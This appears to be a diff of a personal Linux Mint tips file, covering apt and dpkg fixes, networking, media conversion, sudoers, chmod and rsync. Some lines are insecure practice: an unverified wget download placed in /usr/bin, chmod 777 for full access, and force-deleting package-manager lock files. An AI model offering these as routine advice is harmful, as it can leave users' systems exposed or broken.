+		Then using substitution you can then make other secure passwords from simple words and phrases. Don’t lose the card though, or password you have will be lost!
+		Includes options to generate charts with numbers and symbols.
+
+I highly recommend the following sites for telling if the password you are using is secure:
+#	www.passfault.com
+#	www.howsecureismypassword.net
+
+
+#   _____              _    _                 _____             ___  ______  _____ 
+#  /  ___|            | |  (_)               |  _  |           / _ \ | ___ \|_   _|
+#  \ `--.   ___   ___ | |_  _   ___   _ __    \ V /   ______  / /_\ \| |_/ /  | |  
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   / _ \  |______| |  _  ||  __/   | |  
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | | |_| |          | | | || |      | |  
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \_____/          \_| |_/\_|      \_/  
+#                                                                                  
+#                                                                                  
+#   _______  __             ______               __                       ______               __                              _______                   __                     
+#  |    ___||__|.--.--.    |   __ \.----..-----.|  |--..-----..-----.    |   __ \.---.-..----.|  |--..---.-..-----..-----.    |   |   |.-----..---.-..--|  |.-----..----..-----.
+#  |    ___||  ||_   _|    |   __ <|   _||  _  ||    < |  -__||     |    |    __/|  _  ||  __||    < |  _  ||  _  ||  -__|    |       ||  -__||  _  ||  _  ||  -__||   _||__ --|
+#  |___|    |__||__.__|    |______/|__|  |_____||__|__||_____||__|__|    |___|   |___._||____||__|__||___._||___  ||_____|    |___|___||_____||___._||_____||_____||__|  |_____|
+#                                                                                                           |_____|                                                             
+I have not seen this error in a very long time, and I only saw it on Linux Mint Nadia, Olivia, and Petra.
+I'm including it just in case it ever pops up again.
+I noticed that the Package Manager will encounter an odd error. It will display a broken symbol and apt-get update will generate a message like this:
+#	Reading package lists... Error!
+#	E: Encountered a package list with no Package: header
+#	E: Problem with MergeList /var/lib/apt/lists/mirror.umd.edu_linuxmint_packages_dists_nadia_import_i18n_Translation-en
+Going in the help room was no help, because they told me I must have screwed up my install somehow. However this has occasionally happened to me on a fresh install. So I hunted for the solution. Finally figured it out.
+Open two Terminals side-by-side.
+In one Terminal, duplicate the error by typing
+#	sudo apt-get update
+It will download all the lists and error out.
+In the other Terminal go to the folder location mentioned in the error:
+#	cd /var/lib/apt/lists/
+In that folder there are lots of MergeLists, one or more of which is borked (could be more than one, but you’ll only get one error at a time). You will lose nothing by deleting these MergeLists, because they will be completely restored and functional on a new apt-get update. So, I start by axing all the files that broadly match the error file:
+#	sudo rm mirror.umd.edu*
+After that’s done, switch to the other Terminal and type
+#	sudo apt-get update
+Let it update. If you encounter another error, switch to the other Terminal and axe some more MergeLists. Otherwise the error should go away once the MergeLists have been refreshed.
+
+#   _______         __               __         _____   ______  __  __  _______ 
+#  |   |   |.-----.|  |.-----..----.|  |--.    |     \ |   __ \|  |/  ||     __|
+#  |   |   ||     ||  ||  _  ||  __||    <     |  --  ||    __/|     < |    |  |
+#  |_______||__|__||__||_____||____||__|__|    |_____/ |___|   |__|\__||_______|
+#                                                                               
+If you start installing a package, and for whatever reason have to abort the install it will most likely lock up dpkg and you’ll be unable to install anything else until the installation you just started is finished. This can be rough if the package in question won’t install for some reason.
+Sometimes dpkg can get locked because the xapian-index is out of date. Update it and see if this clears the lock.
+#	sudo update-apt-xapian-index  --force
+If that doesn’t work, figure out which program has executed a lock on dpkg:
+#	sudo fuser -vvv /var/lib/dpkg/lock
+#	sudo fuser -vvv /var/lib/apt/lists/lock
+#	sudo fuser -vvv /var/cache/apt/archives/lock
+You can also use fuser to figure out other locks by substituting the lock location in the above command.
+#	sudo fuser -vvv /location/location/location
+You can kill those programs individually by executing a kill on their PID
+#	kill [pid number of dpkg lock]
+If all else fails, just delete the lock files:
+#	sudo rm -fv /var/lib/apt/lists/lock
+#	sudo rm -fv /var/lib/dpkg/lock
+#	sudo rm -fv /var/cache/apt/archives/lock
+Then to stop dpkg from trying to install the same package again.
+#	sudo dpkg -r [name of package you don’t want installing again]
+#	sudo dpkg --configure -a
+It will remove the package from the cache and install any other packages held because of the broken package was lagging the install.
+
+
+#   _____              _    _                 _____            _   _        _                           _    
+#  /  ___|            | |  (_)               |  _  |          | \ | |      | |                         | |   
+#  \ `--.   ___   ___ | |_  _   ___   _ __   | |_| |  ______  |  \| |  ___ | |_ __      __  ___   _ __ | | __
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \  \____ | |______| | . ` | / _ \| __|\ \ /\ / / / _ \ | '__|| |/ /
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | .___/ /          | |\  ||  __/| |_  \ V  V / | (_) || |   |   < 
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \____/           \_| \_/ \___| \__|  \_/\_/   \___/ |_|   |_|\_\
+#                                                                                                            
+#                                                                                                            
+
+
+#   _______                                         _______ _______ _______       ___                            ___         __ __               ___             __                        __               __ 
+#  |_     _|.--.--.----.-----.    .-----.-----.    |    ___|_     _|   |   |    .'  _|.----.-----.--------.    .'  _|.---.-.|__|  |.-----.---.-.'  _|.-----.    |  |_.-----.----.--------.|__|.-----.---.-.|  |
+#    |   |  |  |  |   _|     |    |  _  |     |    |    ___| |   | |       |    |   _||   _|  _  |        |    |   _||  _  ||  |  ||__ --|  _  |   _||  -__|    |   _|  -__|   _|        ||  ||     |  _  ||  |
+#    |___|  |_____|__| |__|__|    |_____|__|__|    |_______| |___| |___|___|    |__|  |__| |_____|__|__|__|    |__|  |___._||__|__||_____|___._|__|  |_____|    |____|_____|__| |__|__|__||__||__|__|___._||__|
+#                                                                                                                                                                                                              
+Place the following into /etc/network/interfaces with an editor.
+#	sudo nano /etc/network/interfaces
+This block of text will cause the network manager to bring up your Ethernet automatically and configure it with DHCP.
+#	auto eth0 iface
+#	iface eth0 inet dhcp
+After adding this restart the network manager with:
+
+#	sudo /etc/init.d/networking restart
+
+If this causes an error message, restart the computer.
+
+
+#   _______               __                __        _____  _______ _______      _______                                    
+#  |    ___|.---.-.-----.|  |_.-----.-----.|  |_     |     \|    |  |     __|    |     __|.-----.----.--.--.-----.----.-----.
+#  |    ___||  _  |__ --||   _|  -__|__ --||   _|    |  --  |       |__     |    |__     ||  -__|   _|  |  |  -__|   _|__ --|
+#  |___|    |___._|_____||____|_____|_____||____|    |_____/|__|____|_______|    |_______||_____|__|  \___/|_____|__| |_____|
+#                                                                                                                            
+Install namebench, and run the namebench utility.
+#	sudo apt-get install namebench
+#	namebench
+
+
+#   _______ __           __      ___ ___                        _______ _______ ______      _______     __     __                         
+#  |    ___|__|.-----.--|  |    |   |   |.-----.--.--.----.    |   |   |   _   |      |    |   _   |.--|  |.--|  |.----.-----.-----.-----.
+#  |    ___|  ||     |  _  |     \     / |  _  |  |  |   _|    |       |       |   ---|    |       ||  _  ||  _  ||   _|  -__|__ --|__ --|
+#  |___|   |__||__|__|_____|      |___|  |_____|_____|__|      |__|_|__|___|___|______|    |___|___||_____||_____||__| |_____|_____|_____|
+#                                                                                                                                         
+To find the MAC address, use the following Terminal command:
+#	ip addr show
+
+
+#   ______ __                   _______               __   __                             __ __   __         _______ _______ ______ 
+#  |   __ \__|.-----.-----.    |_     _|.-----.-----.|  |_|__|.-----.-----.    .--.--.--.|__|  |_|  |--.    |   |   |_     _|   __ \
+#  |    __/  ||     |  _  |      |   |  |  -__|__ --||   _|  ||     |  _  |    |  |  |  ||  |   _|     |    |       | |   | |      <
+#  |___|  |__||__|__|___  |      |___|  |_____|_____||____|__||__|__|___  |    |________||__|____|__|__|    |__|_|__| |___| |___|__|
+#                   |_____|                                         |_____|                                                         
+I like to customize the MTR command to figure out specific things:
+When the command specifies a ping count (using -c) assume that the sensitivity of the report can be raised or lowered by increasing or decreasing the count.
+
+The following command is good for quick toast reports
+#	mtr -c 20 -w -r -location
+The following command is good for testing UDP connections (for Skype)
+#	mtr -c 20 -w -r -u -location
+You can also check IPv4 and IPv6 connectivity using this command
+#	(IPv4) mtr -c 20 -4 -w -r -location
+#	(IPv6) mtr -c 20 -6 -w -r -location
+
+
+#   _____              _    _                 __   _____            _____                                          _   _  _      _                        _____                           _ 
+#  /  ___|            | |  (_)               /  | |  _  |          |_   _|                                        | | | |(_)    | |                      /  ___|                         | |
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `| | | |/' |  ______    | |   _ __ ___    __ _   __ _   ___  ___     | | | | _   __| |  ___   ___   ___     \ `--.   ___   _   _  _ __    __| |
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   | | |  /| | |______|   | |  | '_ ` _ \  / _` | / _` | / _ \/ __|    | | | || | / _` | / _ \ / _ \ / __|     `--. \ / _ \ | | | || '_ \  / _` |
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | _| |_\ |_/ /           _| |_ | | | | | || (_| || (_| ||  __/\__ \ _  \ \_/ /| || (_| ||  __/| (_) |\__ \ _  /\__/ /| (_) || |_| || | | || (_| |
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \___/ \___/            \___/ |_| |_| |_| \__,_| \__, | \___||___/( )  \___/ |_| \__,_| \___| \___/ |___/( ) \____/  \___/  \__,_||_| |_| \__,_|
+#                                                                                             __/ |           |/                                     |/                                     
+#                                                                                            |___/                                                                                          
+
+
+#   _______ ___ ___ _______      __              _______ ______ _____  
+#  |   _   |   |   |_     _|    |  |_.-----.    |   |   |   __ \  |  | 
+#  |       |   |   |_|   |_     |   _|  _  |    |       |    __/__    |
+#  |___|___|\_____/|_______|    |____|_____|    |__|_|__|___|     |__| 
+#                                                                      
+Install mencoder
+#	sudo aptitude install mencoder
+Convert the file
+#	mencoder input.avi -o output.mp4 -oac copy -ovc lavc vcodec=mpeg1video -of mpeg
+
+
+#   ______ _____  _______      __                _____ ______ _______ 
+#  |   __ \     \|    ___|    |  |_.-----.     _|     |   __ \     __|
+#  |    __/  --  |    ___|    |   _|  _  |    |       |    __/    |  |
+#  |___|  |_____/|___|        |____|_____|    |_______|___|  |_______|
+#                                                                     
+Easiest way to do that is to use pdftohtml which is part of the poppler-utils package.
+#	pdftohtml [pdf file]
+Then extract the images from the html folder
+
+
+#   ______  __                __                    _____   ___ ___  _____       __               _______  _______  _______ 
+#  |   __ \|__|.-----..-----.|__|.-----..-----.    |     \ |   |   ||     \     |  |_ .-----.    |_     _||     __||       |
+#  |      <|  ||  _  ||  _  ||  ||     ||  _  |    |  --  ||   |   ||  --  |    |   _||  _  |     _|   |_ |__     ||   -   |
+#  |___|__||__||   __||   __||__||__|__||___  |    |_____/  \_____/ |_____/     |____||_____|    |_______||_______||_______|
+#              |__|   |__|              |_____|                                                                             
+Easiest way to do this is with the dd command
+#	dd if=dev/sr0 of=file.iso
+
+
+
+#   _______                                                   __        __    
+#  |_     _|.--------.---.-.-----.-----.--------.---.-.-----.|__|.----.|  |--.
+#   _|   |_ |        |  _  |  _  |  -__|        |  _  |  _  ||  ||  __||    < 
+#  |_______||__|__|__|___._|___  |_____|__|__|__|___._|___  ||__||____||__|__|
+#                          |_____|                    |_____|                 
+The convert command takes an image, performs actions on it, and saves the image with the file name you specify. One of the most basic things you can do with it is converting images between formats.
+
+The following command takes a PNG file named “howtogeek.png” in the current directory and creates a JPEG image from it:
+#	convert howtogeek.png howtogeek.jpg
+
+You can also specify a compression level for JPEG images:
+#	convert howtogeek.png -quality 95 howtogeek.jpg
+
+The convert command can also quickly resize an image.
+The following command asks ImageMagick to resize an image to 200 pixels in width and 100 pixels in height:
+#	convert example.png -resize 200×100 example.png
+
+It will alter the image to fit within a 200×100 area, but the image may not be exactly 200×100.
+If you want to force the image to become a specific size – even if it messes up the aspect ratio – add an exclamation point to the dimensions:
+#	convert example.png -resize 200×100! example.png
+
+All these operations can be combined. With a single command, you could resize an image, rotate it, apply an effect, and convert it to another format:
+#	convert howtogeek.png -resize 400×400 -rotate 180 -charcoal 4 -quality 95 howtogeek.jpg
+
+You can take advantage of Bash to quickly do batch processing of many images.
+For example, the following command would take all PNG files in the current directory, rotate them, and save a new copy of each with “-rotated” added to the beginning of each file name.
+#	for file in *.png; do convert $file -rotate 90 rotated-$file; done
+
+Many more operations are possible by reading "man convert"
+
+
+#   ________ _______ ___ ___      __              _______ ______ ______ 
+#  |  |  |  |   _   |   |   |    |  |_.-----.    |   |   |   __ \__    |
+#  |  |  |  |       |   |   |    |   _|  _  |    |       |    __/__    |
+#  |________|___|___|\_____/     |____|_____|    |__|_|__|___|  |______|
+#                                                                       
+The following Terminal command can rip wav to mp3 in the Terminal
+#	lame -h -b 256 <input wav file> <output mp3 file>
+
+
+#   _____              _    _                 __   __            ______  _              _     
+#  /  ___|            | |  (_)               /  | /  |           |  ___|| |            | |    
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `| | `| |   ______  | |_   | |  __ _  ___ | |__  
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   | |  | |  |______| |  _|  | | / _` |/ __|| '_ \ 
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | _| |__| |_          | |    | || (_| |\__ \| | | |
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \___/\___/          \_|    |_| \__,_||___/|_| |_|
+#                                                                                             
+#                                                                                             
+
+
+#   ______                    _______         __                              __    __                    _______  ________  _______ 
+#  |   __ \.--.--..-----.    |_     _|.-----.|  |_ .-----..----..---.-..----.|  |_ |__|.--.--..-----.    |     __||  |  |  ||    ___|
+#  |      <|  |  ||     |     _|   |_ |     ||   _||  -__||   _||  _  ||  __||   _||  ||  |  ||  -__|    |__     ||  |  |  ||    ___|
+#  |___|__||_____||__|__|    |_______||__|__||____||_____||__|  |___._||____||____||__| \___/ |_____|    |_______||________||___|    
+#                                                                                                                                    
+Open Terminal
+#	cd /usr/share/mime/packages
+#	sudo nano freedesktop.org.xml
+In that file search for "vnd.adobe.flash.movie"
+This should find a line that looks like:
+#	<mime-type type="application/vnd.adobe.flash.movie">
+Edit that line to read:
+#	<mime-type type="application/x-shockwave-flash">
+Save the file.
+Then run:
+#	sudo update-mime-database /usr/share/mime
+
+
+#   _____              _    _                 __   _____           ______  _  _        ___  ___                                                           _   
+#  /  ___|            | |  (_)               /  | / __  \          |  ___|(_)| |       |  \/  |                                                          | |  
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `| | `' / /'  ______  | |_    _ | |  ___  | .  . |  __ _  _ __    __ _   __ _   ___  _ __ ___    ___  _ __  | |_ 
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   | |   / /   |______| |  _|  | || | / _ \ | |\/| | / _` || '_ \  / _` | / _` | / _ \| '_ ` _ \  / _ \| '_ \ | __|
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | _| |_./ /___          | |    | || ||  __/ | |  | || (_| || | | || (_| || (_| ||  __/| | | | | ||  __/| | | || |_ 
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \___/\_____/          \_|    |_||_| \___| \_|  |_/ \__,_||_| |_| \__,_| \__, | \___||_| |_| |_| \___||_| |_| \__|
+#                                                                                                                     __/ |                                   
+#                                                                                                                    |___/                                    
+
+
+#                    __        
+#  .-----..--.--..--|  |.-----.
+#  |__ --||  |  ||  _  ||  _  |
+#  |_____||_____||_____||_____|
+#                              
 sudo allows a permitted user to execute a command as the superuser or another user, as specified in the sudoers file.
 The real and effective uid and gid are set to match those of the target user as specified in the passwd file (the group vector is also initialized when the target user is not root).
 By default, sudo requires that users authenticate themselves with a password (NOTE: by default this is the user's password, not the root password).
 Once a user has been authenticated, a timestamp is updated and the user may then use sudo without a password for a short period of time (5 minutes unless overridden in sudoers).
 
--------------------------------------------------------------------
-Adding user to access Sudo
-Users are not given sudo on initial install. To fix this, open Terminal, then load the sudoers file.
-	su
-	visudo
 
-You'll see a line in the file that looks like this:
-	# User privilege specification
+#   _______     __     __ __                                                     __                                                                    __        
+#  |   _   |.--|  |.--|  |__|.-----.-----.    .--.--.-----.-----.----.-----.    |  |_.-----.    .---.-.----.----.-----.-----.-----.    .-----.--.--.--|  |.-----.
+#  |       ||  _  ||  _  |  ||     |  _  |    |  |  |__ --|  -__|   _|__ --|    |   _|  _  |    |  _  |  __|  __|  -__|__ --|__ --|    |__ --|  |  |  _  ||  _  |
+#  |___|___||_____||_____|__||__|__|___  |    |_____|_____|_____|__| |_____|    |____|_____|    |___._|____|____|_____|_____|_____|    |_____|_____|_____||_____|
+#                                  |_____|                                                                                                                       
+Users are not given sudo on initial install. To fix this, open Terminal, then load the sudoers file.
+#	su
+#	visudo
+
+You'll see a line in the file under "User privilege specification" that looks like this:
 	root    ALL=(ALL:ALL) ALL
 
 Copy the line beginning with root, and paste it below. Then edit that line so that "root" is the username of the user that needs root/sudo access.
 It should look like this after you are done:
-	# User privilege specification
 	root        ALL=(ALL:ALL) ALL
 	newuser    ALL=(ALL:ALL) ALL
 
- _   _      _                      _    
-| \ | | ___| |___      _____  _ __| | __
-|  \| |/ _ \ __\ \ /\ / / _ \| '__| |/ /
-| |\  |  __/ |_ \ V  V / (_) | |  |   < 
-|_| \_|\___|\__| \_/\_/ \___/|_|  |_|\_\
--------------------------------------------------------------------
-Turning on Ethernet from a failsafe terminal.
 
-Place the following into /etc/network/interfaces with an editor.
-	sudo nano /etc/network/interfaces
-This block of text will cause the network manager to bring up your Ethernet automatically and configure it with DHCP.
-	auto eth0 iface
-	iface eth0 inet dhcp
-After adding this restart the network manager with:
+#   _______  __  __      _______  __                   __        ______  __                         __ 
+#  |   _   ||  ||  |    |   _   ||  |--..-----..--.--.|  |_     |      ||  |--..--------..-----..--|  |
+#  |       ||  ||  |    |       ||  _  ||  _  ||  |  ||   _|    |   ---||     ||        ||  _  ||  _  |
+#  |___|___||__||__|    |___|___||_____||_____||_____||____|    |______||__|__||__|__|__||_____||_____|
+#                                                                                                      
 
-sudo /etc/init.d/networking restart
-
-If this causes an error message, restart the computer.
--------------------------------------------------------------------
-Finding the Fastest DNS servers
-Install namebench, and run the namebench utility.
-	sudo apt-get install namebench
-	namebench
-
--------------------------------------------------------------------
-To Find the MAC Address of a Disconnected Computer
-Connection information doesn’t usually display your MAC address until the computer is connected to the internet. To find the MAC address, use the following Terminal command:
-	ip addr show
-
--------------------------------------------------------------------
-How to Do Ping Testing with MTR
-I like to customize the MTR command to figure out specific things:
-When the command specifies a ping count (using -c) assume that the sensitivity of the report can be raised or lowered by increasing or decreasing the count.
-
-The following command is good for quick toast reports
-	mtr -c 20 -w -r -location
-The following command is good for testing UDP connections (for Skype)
-	mtr -c 20 -w -r -u -location
-You can also check IPv4 and IPv6 connectivity using this command
-	(IPv4) mtr -c 20 -4 -w -r -location
-	(IPv6) mtr -c 20 -6 -w -r -location
-
- _     _                    __  __ _       _   
-| |   (_)_ __  _   ___  __ |  \/  (_)_ __ | |_ 
-| |   | | '_ \| | | \ \/ / | |\/| | | '_ \| __|
-| |___| | | | | |_| |>  <  | |  | | | | | | |_ 
-|_____|_|_| |_|\__,_/_/\_\ |_|  |_|_|_| |_|\__|
--------------------------------------------------------------------
-Installing Debian Sources into Mint
-THIS IS NOT RECOMMENDED!! It is possible, but used unwisely this could easily break your system.
-Add all the sources you want to /etc/apt/sources.list.d/ in a seperate file that ends with the .list extension
-Update the repos. It will probably give you an error that PUBKEY could not be verified.
-To verify Debian sources:
-	sudo apt-get install debian-archive-keyring debian-keyring
-
-	debian-archive-keyring       - GnuPG archive keys of the Debian archive
-	debian-edu-archive-keyring   - GnuPG archive keys of the Debian Edu archive
-	debian-keyring               - GnuPG keys of Debian Developers
-	debian-ports-archive-keyring - GnuPG archive keys of the debian-ports archive
-	emdebian-archive-keyring     - GnuPG archive keys for the emdebian repository
-
--------------------------------------------------------------------
-Getting mintstick on Ubuntu/Debian based distros (that aren't Mint)
-Mintstick is a handy tool to use for formatting and creating USB sticks. It's so much easier to use this tool than use fdisk or mkfs
-It also includes an imagewriter that makes creating Live Linux USB drives a snap!
-However, this package is only included on Linux Mint distros. If you're not using Mint, you'll need to follow the steps below.
-	wget http://packages.linuxmint.com/pool/main/m/mintstick/mintstick_1.2.8_all.deb
-	sudo dpkg -i mintstick_1.2.8_all.deb
-It probably won't install because of missing packages, so...
-	sudo apt-get install -f
-
-__     ___     _                
-\ \   / (_) __| | ___  ___  ___ 
- \ \ / /| |/ _` |/ _ \/ _ \/ __|
-  \ V / | | (_| |  __/ (_) \__ \
-   \_/  |_|\__,_|\___|\___/|___/
--------------------------------------------------------------------
-Convert avi to mp4
-Install mencoder
-	mencoder input.avi -o output.mp4 -oac copy -ovc lavc vcodec=mpeg1video -of mpeg
-
- ___                                 
-|_ _|_ __ ___   __ _  __ _  ___  ___ 
- | || '_ ` _ \ / _` |/ _` |/ _ \/ __|
- | || | | | | | (_| | (_| |  __/\__ \
-|___|_| |_| |_|\__,_|\__, |\___||___/
-                     |___/           
--------------------------------------------------------------------
-Convert pdf to jpg
-Easiest way to do that is to use pdftohtml which is part of the poppler-utils package.
-	pdftohtml [pdf file]
-
--------------------------------------------------------------------
-Using Imagemagick
-The convert command takes an image, performs actions on it, and saves the image with the file name you specify. One of the most basic things you can do with it is converting images between formats.
-
-The following command takes a PNG file named “howtogeek.png” in the current directory and creates a JPEG image from it:
-	convert howtogeek.png howtogeek.jpg
-
-You can also specify a compression level for JPEG images:
-	convert howtogeek.png -quality 95 howtogeek.jpg
-
-The convert command can also quickly resize an image.
-The following command asks ImageMagick to resize an image to 200 pixels in width and 100 pixels in height:
-	convert example.png -resize 200×100 example.png
-
-It will alter the image to fit within a 200×100 area, but the image may not be exactly 200×100.
-If you want to force the image to become a specific size – even if it messes up the aspect ratio – add an exclamation point to the dimensions:
-	convert example.png -resize 200×100! example.png
-
-All these operations can be combined. With a single command, you could resize an image, rotate it, apply an effect, and convert it to another format:
-	convert howtogeek.png -resize 400×400 -rotate 180 -charcoal 4 -quality 95 howtogeek.jpg
-
-You can take advantage of Bash to quickly do batch processing of many images.
-For example, the following command would take all PNG files in the current directory, rotate them, and save a new copy of each with “-rotated” added to the beginning of each file name.
-	for file in *.png; do convert $file -rotate 90 rotated-$file; done
-
-Many more operations are possible by reading "man convert"
- ____  _                _                               _____ _           _     
-/ ___|| |__   ___   ___| | ____      ____ ___   _____  |  ___| | __ _ ___| |__  
-\___ \| '_ \ / _ \ / __| |/ /\ \ /\ / / _` \ \ / / _ \ | |_  | |/ _` / __| '_ \ 
- ___) | | | | (_) | (__|   <  \ V  V / (_| |\ V /  __/ |  _| | | (_| \__ \ | | |
-|____/|_| |_|\___/ \___|_|\_\  \_/\_/ \__,_| \_/ \___| |_|   |_|\__,_|___/_| |_|
--------------------------------------------------------------------
-Run Interactive .swf Files Natively on Linux Mint
-Open Terminal
-	cd /usr/share/mime/packages
-	sudo nano freedesktop.org.xml
-In that file search for "vnd.adobe.flash.movie"
-This should find a line that looks like:
-	<mime-type type="application/vnd.adobe.flash.movie">
-Edit that line to read:
-	<mime-type type="application/x-shockwave-flash">
-Save the file.
-Then run:
-	sudo update-mime-database /usr/share/mime
-
--------------------------------------------------------------------
-Another way to Interact with Flash Files?
-Electic_Peppermint gave me this, and found at http://askubuntu.com/questions/478169/why-cant-firefox-run-local-swf-files
-Another option is to create ~/.mime.types in the home directory with following content:
-	"application/x-shockwave-flash       swf swfl"
-This way it will not get overwritten on system upgrade.
-
-[10/23/15 10:02] <Electric_Peppermint> create an "untitled document" in your home directory and name it ".mime.types". The file name will not show up in your file browser.
-[10/23/15 10:02] <Electric_Peppermint> Open the file with gedit and paste this line into it, "application/x-shockwave-flash       swf swfl". Now go to File and click Save. You're done.
-[10/23/15 10:02] <Electric_Peppermint> When you refresh the page in your file browser the document will be automatically hidden.
-
- ____                                          
-|  _ \ _ __ ___   __ _ _ __ __ _ _ __ ___  ___ 
-| |_) | '__/ _ \ / _` | '__/ _` | '_ ` _ \/ __|
-|  __/| | | (_) | (_| | | | (_| | | | | | \__ \
-|_|   |_|  \___/ \__, |_|  \__,_|_| |_| |_|___/
-                 |___/                         
--------------------------------------------------------------------
-Ripping .wav to .mp3
-	lame -h -b 256 <input wav file> <output mp3 file>
-
--------------------------------------------------------------------
-Installing ScreenFetch
-
-Screenfetch is a really cool way of displaying infos about your computer in a Terminal.
-	wget -O screenfetch 'https://raw.github.com/KittyKatt/screenfetch/master/screenfetch-dev'
-	chmod +x screenfetch
-	sudo mv screenfetch /usr/bin/
-
--------------------------------------------------------------------
-Installing Mouse Cursors
-Drop cursor files in /usr/share/icons
-Select a cursor theme. Restart computer to apply.
-
--------------------------------------------------------------------
-Installing libdvdcss2
-	sudo apt-get install libdvdread4
-	sudo /usr/share/doc/libdvdread4/install-css.sh
-
-__        ___            
-\ \      / (_)_ __   ___ 
- \ \ /\ / /| | '_ \ / _ \
-  \ V  V / | | | | |  __/
-   \_/\_/  |_|_| |_|\___|
--------------------------------------------------------------------
-Installing Wine
-	sudo add-apt-repository ppa:ubuntu-wine/ppa
-
--------------------------------------------------------------------
-Removing WINE programs from the menu
-Sometimes after you uninstall a program from WINE, the menu entry remains behind. Here’s how to remove the menu entry as well:
-	$HOME/.config/menus/applications-merged/wine
-	$HOME/.local/share/applications/wine
-	$HOME/.local/share/desktop-directories/wine
-	$HOME/.local/share/icons
-
- _____ _ _        __  __                                                   _   
-|  ___(_) | ___  |  \/  | __ _ _ __   __ _  __ _  ___ _ __ ___   ___ _ __ | |_ 
-| |_  | | |/ _ \ | |\/| |/ _` | '_ \ / _` |/ _` |/ _ \ '_ ` _ \ / _ \ '_ \| __|
-|  _| | | |  __/ | |  | | (_| | | | | (_| | (_| |  __/ | | | | |  __/ | | | |_ 
-|_|   |_|_|\___| |_|  |_|\__,_|_| |_|\__,_|\__, |\___|_| |_| |_|\___|_| |_|\__|
-                                           |___/                               
--------------------------------------------------------------------
-All About Chmod
 You can see file permissions by typing
-	ls -l
+#	ls -l
 
 You can also you binary coding to set permissions. The code is split the following way:
 
--------------------------------------------------------------------------------------------------
-|	Owner			|	Group			|	Others			|
-|(R)ead, (W)rite, (E)xecute	|(R)ead, (W)rite, (E)xecute	|(R)ead, (W)rite, (E)xecute	|
--------------------------------------------------------------------------------------------------
+(R)ead		-------------------------------------------
+(W)rite		|    Owner    |    Group    |    Other    |
+(E)xecute	| (R) (W) (E) | (R) (W) (E) | (R) (W) (E) |
+		-------------------------------------------
 
-000 = 0 (Completely locked)
-001 = 1 (Execute only)
-010 = 2 (Write only)
-011 = 3 (Write and execute)
-100 = 4 (Read only)
-101 = 5 (Read and execute)
-110 = 6 (Read and write)
-111 = 7 (Full access)
+		000 = 0 = (Completely locked)
+		001 = 1 = (Execute only)
+		010 = 2 = (Write only)
+		011 = 3 = (Write and execute)
+		100 = 4 = (Read only)
+		101 = 5 = (Read and execute)
+		110 = 6 = (Read and write)
+		111 = 7 = (Full access)
 
 So to give a file full access permissions for anyone use:
-	chmod 777 [file]
-
--------------------------------------------------------------------
-Ripping DVD to ISO
-	Use dd command
-	dd if=/dev/cdrom of=file.iso
-
--------------------------------------------------------------------
-Getting a load bar with the dd command
-
-dd can convert and copy files from source to destination.
-	if=PATH - Read from PATH
-	of=PATH - Write to PATH
-
-The standard way to use dd is:
-	dd if=/path/to/source of=/path/to/write
-
-Sending a USR1 signal to a running 'dd' process makes it print I/O statistics to standard error and then resume copying.
-
-	$ dd if=/dev/zero of=/dev/null& pid=$!
-	$ kill -USR1 $pid; sleep 1; kill $pid
-		18335302+0 records in 18335302+0 records out 9387674624 bytes (9.4 GB) copied, 34.6279 seconds, 271 MB/s
+#	chmod 777 [file]
 
 
-Another method is to use pv to add a loading bar.
-To get a loading bar on dd:
-	sudo aptitude install pv
-Then use the following piped command:
-	dd if=/path/to/source | pv | dd of=/path/to/write
-
-
- ____  ______   ___   _  ____ 
-|  _ \/ ___\ \ / / \ | |/ ___|
-| |_) \___ \\ V /|  \| | |    
-|  _ < ___) || | | |\  | |___ 
-|_| \_\____/ |_| |_| \_|\____|
--------------------------------------------------------------------
-Using RSYNC
-
-rsync stands for remote sync.First time, rsync replicates the whole content between the source and destination directories. Next time, rsync transfers only the changed blocks or bytes to the destination location, which makes the transfer really fast.
-	rsync [options] source destination
+#   ______  _______  ___ ___  _______  ______ 
+#  |   __ \|     __||   |   ||    |  ||      |
+#  |      <|__     | \     / |       ||   ---|
+#  |___|__||_______|  |___|  |__|____||______|
+#                                             
+rsync stands for remote sync. First time, rsync replicates the whole content between the source and destination directories. Next time, rsync transfers only the changed blocks or bytes to the destination location, which makes the transfer really fast.
+#	rsync [options] source destination
 Here’s how I use rsync when backing up my hard drive to an external backup.
-	rsync -izvrdop --progress source destination
-
+#	rsync -izvrdop --progress source destination
 Here's a way to mirror a folder onto an external SD card, so that the files are transferred in the correct order.
-	rsync -avP
+#	rsync -avP
 For transferring songs from folder to KH SD card, make a folder on the computer with the songs correctly labeled and in order. The copy the files from the folder to two folders on the SD labeled A and Z.
-	rsync -ravP source/ /media/user/Music/A/
-	rsync -ravP source/ /media/user/Music/Z/
-
+#	rsync -ravP source/ /media/user/Music/A/
+#	rsync -ravP source/ /media/user/Music/Z/
 If a file is not present at the source, but present at the target, you might want to delete the file at the target during rsync.
 In that case, use –delete option as shown below. rsync delete option deletes files that are not there in source directory.
-	rsync -zvrdop --delete source destination
-
+#	rsync -zvrdop --delete source destination
 If you like, you can update (Sync) only the existing files at the target. In case source has new files, which is not there at the target, you can avoid creating these new files at the target. If you want this feature, use –existing option with rsync command.
-	rsync -zvrdop --existing source destination
-
+#	rsync -zvrdop --existing source destination
 Use -i to view the difference between the source and destination files before transfer. In the output, it will display up to 11 letters in front of the filename or directory name to indicate the changes. Check “man rsync” for the meanings of these letters.
-	rsync -izvrdop source destination
-
+#	rsync -izvrdop source destination
 Use the --dry-run option for testing. This won’t transfer files but will simulate the transfer
-	rsync -zvrdop --dry-run source destination
-
- ____    _    ____  _   _ 
-| __ )  / \  / ___|| | | |
